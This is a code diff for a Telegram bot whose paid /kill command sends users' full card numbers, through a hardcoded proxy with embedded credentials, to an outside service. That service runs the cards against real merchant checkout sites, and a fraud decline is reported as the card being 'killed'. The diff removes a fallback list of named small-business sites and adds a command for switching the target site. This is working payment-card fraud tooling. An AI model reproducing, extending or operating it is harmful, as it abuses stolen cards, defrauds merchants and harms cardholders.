@@ -2559,31 +2559,10 @@ from db import get_user, update_user
 import json
 
 # ---------------- CONFIG ----------------
-KILL_API = (
-    "https://rockyog.onrender.com/index.php"
-    "?site=https://deltacloudz.com"
-    "&cc={full_card}"
-    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-)
+DEFAULT_KILL_SITE = "https://deltacloudz.com"
+KILL_PROXY = "107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
 
-FALLBACK_SITES = [
-    "therapyessentials.coraphysicaltherapy.com",
-    "lptmedical.com",
-    "bacteriostaticwater.com",
-    "divinebovinejerky.com",
-    "livelovespa.com",
-    "urbanspaceinteriors.com",
-]
-
-FALLBACK_ERRORS = [
-    "CLINTE TOKEN",
-    "R4 TOKEN EMPTY",
-    "TAX AMOUNT EMPTY",
-    "GENERIC_ERROR",
-    "DEL AMOUNT EMPTY",
-    "PRODUCT ID EMPTY",
-    "PY ID EMPTY"
-]
+kill_site = DEFAULT_KILL_SITE  # Global site used in /kill
 
 COOLDOWN = 5                 # per-user cooldown seconds
 ANIM_STEP_DELAY = 0.7        # animation speed (seconds per char)
@@ -2595,7 +2574,6 @@ developer_clickable = f'<a href="{DEVELOPER_LINK}">{DEVELOPER_NAME}</a>'
 
 # ---------------- credits ----------------
 async def consume_credit(user_id: int, amount: int = 5) -> bool:
-    """Deduct `amount` credits from user. Returns True on success."""
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) >= amount:
         new_credits = user_data["credits"] - amount
@@ -2603,7 +2581,7 @@ async def consume_credit(user_id: int, amount: int = 5) -> bool:
         return True
     return False
 
-# ---------------- command entry ----------------
+# ---------------- /kill command ----------------
 async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     now = time.time()
@@ -2616,12 +2594,11 @@ async def kill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # set cooldown and schedule background task
     user_cooldowns[user_id] = now
     asyncio.create_task(_kill_task(update, context, user_id))
 
-# ---------------- background worker ----------------
 async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    global kill_site
     anim_task = None
     try:
         start_time = time.time()
@@ -2674,8 +2651,8 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Initial message ---
         try:
             msg = await update.message.reply_text(
-                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝙘𝗚𝗲𝙨𝙨⏳</code></pre>\n"
-                "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫",
+                "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝙘𝗲𝙨𝙨⏳</code></pre>\n"
+                f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {escape(kill_site)}",
                 parse_mode=ParseMode.HTML,
                 disable_web_page_preview=True
             )
@@ -2689,7 +2666,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         # --- Animation ---
         async def _animate_loop(message):
             anim_texts = [
-                "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝗈𝙣 𝙄𝙨 𝙋𝗿𝗼𝗰𝗲𝙨𝙨𝗂𝗇𝗀...",
+                "⚡𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝗈𝙣 𝙄𝙨 𝙋𝗿𝗼𝗰𝗲𝙨𝙨𝗂𝗻𝗀...",
                 "𝙋𝗹𝙚𝗮𝙨𝗲 𝙬𝗮𝗶𝙩 𝙛𝗈𝗋...",
                 "𝙖 𝙬𝗵𝗂𝗹𝗲..."
             ]
@@ -2702,7 +2679,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
                         text = (
                             "<pre><code>𝙆𝙞𝙡𝙡𝙞𝗇𝗀 𝙄𝙣 𝙋𝗿𝗼𝗰𝗲𝙨𝙨⏳</code></pre>\n"
                             f"<pre><code>{escape(shown)}</code></pre>\n"
-                            "𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝐊𝐢𝐥𝐥𝐞𝐫"
+                            f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ {escape(kill_site)}"
                         )
                         try:
                             await message.edit_text(text, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -2715,51 +2692,24 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
 
         anim_task = asyncio.create_task(_animate_loop(msg))
 
-        # --- Prepare sites to try ---
-        sites_to_try = [KILL_API.format(full_card=cc)]
-        for site in FALLBACK_SITES:
-            sites_to_try.append(
-                f"https://rockyog.onrender.com/index.php?site={site}&cc={cc}&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
-            )
-
-        # --- Perform API calls with fallback ---
-        final_status = "❌ FAILED / TIMEOUT"
-        display_response = "The card could not be killed."
-
+        # --- API call ---
+        KILL_API = f"https://rockyog.onrender.com/index.php?site={kill_site}&cc={cc}&proxy={KILL_PROXY}"
         async with aiohttp.ClientSession() as session:
-            for site_url in sites_to_try:
-                try:
-                    async with session.get(site_url, timeout=55) as resp:
+            try:
+                async with session.get(KILL_API, timeout=55) as resp:
+                    try:
+                        data = await resp.json()
+                    except Exception:
+                        txt = await resp.text()
                         try:
-                            data = await resp.json()
+                            data = json.loads(txt)
                         except Exception:
-                            txt = await resp.text()
-                            try:
-                                data = json.loads(txt)
-                            except Exception:
-                                data = {"Response": txt}
-                except Exception:
-                    await asyncio.sleep(1)
-                    continue
+                            data = {"Response": txt}
+            except Exception:
+                data = {"Response": "FAILED / TIMEOUT"}
 
-                response = (data.get("Response") or "").upper()
-                message_text = (data.get("Message") or data.get("message") or "").upper()
-
-                # ✅ Success conditions
-                if response in ("CARD_DECLINED", "FRAUD_SUSPECTED"):
-                    final_status = "✅ 𝗞𝗶𝗹𝗹𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆"
-                    display_response = "Your card has been killed successfully."
-                    break
-
-                # ⚠️ Check if fallback needed
-                fallback_needed = any(err in response or err in message_text for err in FALLBACK_ERRORS)
-                if fallback_needed:
-                    continue  # try next site
-
-                # ❌ Non-fallback failure
-                final_status = "❌ FAILED"
-                display_response = message_text or "Gateway returned an unrecoverable response."
-                break  # stop trying further sites
+        response = (data.get("Response") or "").upper()
+        display_response = data.get("Message") or data.get("message") or response
 
         # --- Stop animation ---
         anim_task.cancel()
@@ -2778,7 +2728,7 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         elapsed_time = round(time.time() - start_time, 1)
         escaped_card = escape(cc[:6] + "******" + cc[-3:])
         final_text = (
-            f"<b><i>{final_status}</i></b>\n\n"
+            f"<b><i>{response}</i></b>\n\n"
             f"𝐂𝐚𝐫𝐝\n⤷ <code>{escaped_card}</code>\n"
             f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{escape(display_response)}</code></i>\n\n"
             f"<pre>"
@@ -2809,6 +2759,30 @@ async def _kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id
         except Exception:
             pass
         print(f"[ERROR] /kill task failed: {e}")
+
+# ---------------- /changekillsite command ----------------
+async def changekillsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global kill_site
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Please provide a new site.\nExample:\n<code>/changekillsite https://newsite.com</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    new_site = context.args[0].strip()
+    if not new_site.startswith("http"):
+        await update.message.reply_text(
+            "❌ Invalid URL. Make sure it starts with http or https.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+
+    kill_site = new_site
+    await update.message.reply_text(
+        f"✅ Kill site has been updated to:\n<code>{escape(kill_site)}</code>",
+        parse_mode=ParseMode.HTML
+    )
 
 
 
